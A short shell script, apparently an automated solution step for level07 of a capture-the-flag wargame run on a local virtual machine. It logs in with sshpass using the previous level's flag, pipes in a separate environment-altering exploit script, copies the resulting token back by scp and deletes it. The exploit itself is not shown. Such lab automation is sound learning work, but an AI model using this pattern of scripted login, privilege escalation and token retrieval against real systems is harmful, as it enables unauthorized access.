#!/bin/sh -eu

PREVIOUS_FLAG=../../level06/flag
ADDRESS=192.168.122.214
PORT=4242
FLAG=../flag

# Run the script to hack the `level07` file and get the token on the virtual machine
sshpass -f ${PREVIOUS_FLAG} <run_level07_with_altered_env.sh 2>/dev/null \
	ssh -p ${PORT} level07@${ADDRESS} sh -s

# Copy the token from the virtual machine
sshpass -f ${PREVIOUS_FLAG} 2>/dev/null \
	scp -P ${PORT} level07@${ADDRESS}:/tmp/token ${FLAG}

# Clean the virtual machine
sshpass -f ${PREVIOUS_FLAG} 2>/dev/null \
	ssh -p ${PORT} level07@${ADDRESS} 'rm /tmp/token'

exit 0
